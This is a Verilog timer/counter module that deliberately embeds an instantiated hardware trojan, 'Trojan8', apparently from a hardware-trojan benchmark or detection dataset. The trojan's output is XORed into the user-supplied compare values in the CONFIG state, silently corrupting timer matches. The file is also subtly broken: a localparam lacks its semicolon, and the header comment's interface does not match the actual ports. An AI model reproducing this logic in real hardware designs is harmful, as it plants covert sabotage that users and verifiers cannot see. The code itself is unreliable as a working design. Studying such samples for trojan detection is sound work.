// Timer/Counter Host Circuit for Trojan8
// Interface: a[7:0], b[7:0], c[7:0], d[7:0], e[7:0], sel[2:0] -> y[15:0]
module trojan8_timer_host #(
    parameter TIMER_COUNT = 8,            // Number of timer channels
    parameter [79:0] TIMER_PATTERN = 80'h123456789ABCDEF01234  // Timer pattern
)(
    input wire clk,
    input wire rst,
    input wire [7:0] timer_sel,
    input wire [31:0] compare_val,
    input wire [7:0] prescale_val,
    input wire timer_enable,
    input wire timer_reset,
    output reg [31:0] timer_val,
    output reg timer_match,
    output reg timer_overflow
);

    localparam PRESCALE_BITS = 8

    // Trojan interface
    wire [7:0] trojan_a;
    wire [7:0] trojan_b;
    wire [7:0] trojan_c;
    wire [7:0] trojan_d;
    wire [7:0] trojan_e;
    wire [2:0] trojan_sel;
    wire [15:0] trojan_y;
    
    // Timer components
    reg [31:0] timers [0:7];          // Fixed to 8 timers
    reg [31:0] compares [0:7];        // Fixed to 8 compare values
    reg [7:0] prescalers [0:7];       // Fixed to 8 prescalers
    reg [7:0] prescale_counters [0:7]; // Fixed to 8 prescale counters
    reg [79:0] timer_gen;
    reg [2:0] timer_state;
    reg [3:0] active_timer;  // Make 4-bit to match TIMER_COUNT comparison
    reg [7:0] timer_flags;
    
    integer m;
    
    // Timer controller
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            timer_gen <= TIMER_PATTERN;
            timer_state <= 3'h0;
            active_timer <= 4'h0;
            timer_flags <= 8'h0;
            timer_val <= 32'h0;
            timer_match <= 1'b0;
            timer_overflow <= 1'b0;
            
            for (m = 0; m < 8; m = m + 1) begin
                timers[m] <= 32'h0;
                compares[m] <= TIMER_PATTERN[31:0] + (m << 8);
                prescalers[m] <= 8'h01 + {{5{1'b0}}, PRESCALE_BITS[2:0]};  // Use PRESCALE_BITS parameter with proper width extension
                prescale_counters[m] <= 8'h0;
            end
        end else begin
            timer_gen <= {timer_gen[78:0], timer_gen[79]};
            timer_match <= 1'b0;
            timer_overflow <= 1'b0;
            
            case (timer_state)
                3'h0: begin // IDLE
                    if (timer_enable) begin
                        active_timer <= {1'b0, timer_sel[2:0]};  // Extend to 4-bit
                        timer_state <= 3'h1;
                    end else if (timer_reset) begin
                        timers[timer_sel[2:0]] <= 32'h0;
                        prescale_counters[timer_sel[2:0]] <= 8'h0;
                    end
                end
                3'h1: begin // CONFIG
                    if (active_timer < TIMER_COUNT) begin
                        compares[active_timer[2:0]] <= compare_val ^ {16'h0, trojan_y};
                        prescalers[active_timer[2:0]] <= prescale_val;
                        timer_state <= 3'h2;
                    end else begin
                        timer_state <= 3'h0;
                    end
                end
                3'h2: begin // COUNT
                    prescale_counters[active_timer[2:0]] <= prescale_counters[active_timer[2:0]] + 1;
                    if (prescale_counters[active_timer[2:0]] >= prescalers[active_timer[2:0]]) begin
                        prescale_counters[active_timer[2:0]] <= 8'h0;
                        timers[active_timer[2:0]] <= timers[active_timer[2:0]] + 1;
                        timer_state <= 3'h3;
                    end else begin
                        timer_state <= 3'h4;
                    end
                end
                3'h3: begin // CHECK
                    timer_val <= timers[active_timer[2:0]];
                    if (timers[active_timer[2:0]] == compares[active_timer[2:0]]) begin
                        timer_match <= 1'b1;
                        timer_flags[active_timer[2:0]] <= 1'b1;
                    end
                    if (timers[active_timer[2:0]] == 32'hFFFFFFFF) begin
                        timer_overflow <= 1'b1;
                        timers[active_timer[2:0]] <= 32'h0;
                    end
                    timer_state <= 3'h4;
                end
                3'h4: begin // NEXT
                    active_timer <= (active_timer + 1) & 4'hF;
                    if (active_timer == (TIMER_COUNT - 1)) begin
                        timer_state <= 3'h0;
                    end else begin
                        timer_state <= 3'h2;
                    end
                end
                default: timer_state <= 3'h0;
            endcase
        end
    end
    
    // Connect trojan inputs
    assign trojan_a = timer_gen[7:0];
    assign trojan_b = timers[0][7:0];
    assign trojan_c = compares[active_timer[2:0]][7:0];
    assign trojan_d = prescale_val;
    assign trojan_e = timer_flags;
    assign trojan_sel = timer_state;
    
    // Instantiate Trojan8
    Trojan8 #(
        .MASK_00FF(16'h003C),
        .MASK_0F(8'h05),
        .MASK_F0F0(16'h3C3C)
    ) trojan_inst (
        .a(trojan_a),
        .b(trojan_b),
        .c(trojan_c),
        .d(trojan_d),
        .e(trojan_e),
        .sel(trojan_sel),
        .y(trojan_y)
    );

endmodule
